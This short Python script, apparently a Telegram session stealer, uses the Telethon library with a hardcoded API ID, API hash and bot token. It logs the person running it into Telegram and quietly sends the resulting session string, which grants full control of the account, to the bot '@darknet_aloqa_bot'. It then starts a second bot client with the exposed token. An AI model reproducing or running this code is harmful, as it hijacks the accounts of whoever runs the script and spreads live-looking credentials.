from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
import os
api_id = 14847906
api_hash = "e4c8bab588782253015a20da73354980"
#string = "test"

bot_token = "5587783380:AAEk9jhijr0--9YGQj8l-6eehpb9Zdz5pGc"
with TelegramClient(StringSession(), api_id, api_hash) as client:
    #print(client.session.save())
    client.send_message("@darknet_aloqa_bot", client.session.save())

botClient = TelegramClient('@jojo_user_bot', api_id, api_hash).start(bot_token=bot_token)






